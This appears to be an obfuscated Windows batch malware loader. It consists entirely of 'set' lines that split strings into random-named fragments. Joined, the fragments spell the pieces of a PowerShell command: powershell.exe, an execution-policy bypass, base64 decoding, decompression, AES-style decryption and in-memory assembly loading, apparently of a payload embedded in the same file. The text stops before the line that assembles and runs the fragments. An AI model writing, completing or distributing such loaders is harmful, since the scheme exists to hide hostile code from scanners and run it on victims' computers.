@echo off
set "dAatQHRkvb=ws"
set "qBGgGkfgTG=in"
set "RhqtOWnfsL=rs"
set "bHGPqXByMI=ow"
set "gtFpAwBskd=he"
set "fKOnSyoPZv=\v"
set "wbcozFwaOP=:\"
set "sULRPaPsJN=he"
set "LZtnCtnWqC=we"
set "IyFmAVBgwh=we"
set "lUNeMNNNxA=1."
set "nabcqFVNTU=ll"
set "SULmVCskEH= /"
set "HpPfOgPjgA=ll"
set "bkbXCnyeAt=\W"
set "gpQwNIYTgR=st"
set "UuFHSNxZGX=.e"
set "CpBncpvMXy=s\"
set "ZDNmoZppds=py"
set "ubfnksueMf=xe"
set "FSeLRKzhjr=nd"
set "gdYSQLOXwN=y "
set "mfIUAuefhZ=do"
set "qFJxPtrUFR=Wi"
set "QmqplMgdef=Po"
set "oMkLpOEyTN=32"
set "isXApQBmqZ=rS"
set "UekMRtiJYB= C"
set "RSiXoprQIC=em"
set "UOsvTIgyYr=po"
set "cndhWDWrxP=Sy"
set "gjxJUhrVkK=0\"
set "PKUbLkqErN=co"
set "dwUsRlPwYF=cd"
set "WndvJfcFwi= %~dp0"
set "KCzRLkbaCD=ionM"
set "VXfTMYlqwW=$qrc"
set "WpJhGzPnIk=UgwQ"
set "brJUjqesnQ=comp"
set "ireaEqExNL== [S"
set "CGXDyATTlh=null"
set "gDNdTKQoAv=ring"
set "nimvCdEqjI=gnir"
set "KmoXqWevDg=lO.D"
set "AnuTMXRbkT=oArr"
set "xmzlAfTLKL=ke($"
set "hsPzcHbJND=;$Vi"
set "BBwUgXXweU=zHhH"
set "ahqxiVlarG=O.Me"
set "MFTlFfVhly=$efw"
set "WvdKXZKkoG=Star"
set "YFuRZDQmMR=();$"
set "TkppfxAjsp=.Cop"
set "xFFzWPJxXv=Comp"
set "EciXoDsWxZ=('%*'"
set "AeRvlaAzDL=6] -"
set "MnEEWtuYXU=ion."
set "yvWmTwyZcI= '')"
set "mBeJSGolVY=);$e"
set "WKSJrbfGJR=zZ ="
set "kWtJhURGTu=ca);"
set "qBWkFARLpD='txe"
set "rMZxAtuXDM=pStr"
set "AEYaduUVCD== $e"
set "wiepYcHxNt=::('"
set "bjtfEmQqQu=Disp"
set "tEWEBfijwI=106u"
set "SfxDHfgpLL= = N"
set "UWgbeyOnlZ=();$"
set "slPsoLsqEg=ct S"
set "lcVKhhoAGI=tion"
set "CNBfOCWKNE=ress"
set "IeNOhzdJsf=ect "
set "qfGKDObFVU=]::N"
set "IeksigolvB=UuNs"
set "xqhezaLUPM=.Ass"
set "vLAdCYDCfw=ode]"
set "CuuVFpKYCq=ss -"
set "BgulVBcSkr=fwBO"
set "vRoaGIraTv=ihdM"
set "gebwDWcyhW=ypto"
set "FQhREFxjNR=pose"
set "lhMsZPBrLT=DPw."
set "kgWBpDHYgj=bjec"
set "XqoTZzMzJJ=.-16"
set "OKoTiahcTL=Obje"
set "leSVYosRiZ= = ["
set "mpRszBDkXP=  $z"
set "fBOzixkEJE=-ep "
set "CXlwwrXplS=zuZI"
set "NLbniLiiXK=se()"
set "ZuhVuarcpc=ress"
set "vgSOshLDse=$qsP"
set "FTuCyqbaZy=[Sys"
set "kWFyTaMFiF= if "
set "ylWEzPvCJB=comm"
set "rPGkqXIprh=();$"
set "kwHCPVyetZ=ck($"
set "NaDUNXukQa=gth)"
set "yfrjhUGgYZ=oint"
set "NkOXWbcbgp=$Hka"
set "eqVhXkfdmC=em.C"
set "NstbjftiFw=;$yp"
set "vCMgjhCzzO=esaB"
set "EQzujXWEgt=('Tg"
set "JAkibGAYku=XegU"
set "lkwTNzsZxl=-joi"
set "BcrynzNjIB=pres"
set "jPCZsiiTTV=Fjga"
set "YDjCKvlUcc=y]::"
set "ocRfBqCJsD=DPw "
set "fuYEZxIwEU=a = "
set "bLkRAMOgNX=pher"
set "EaZtoRpZrp=fwBO"
set "jjgtNGejat=ert]"
set "JcvXuSbkNQ=Bmor"
set "UBirEKVzCW=yste"
set "rkcRYRFPhM=rofi"
set "ydrhaVNici=ateD"
set "uHgkCTbAeI=]::C"
set "gKpgHXavLy=Obje"
set "iXubYKDhDq=trea"
set "qbWYaoUesw=ress"
set "FyujhvnGQv=onve"
set "whdmIkJFxx=t Sy"
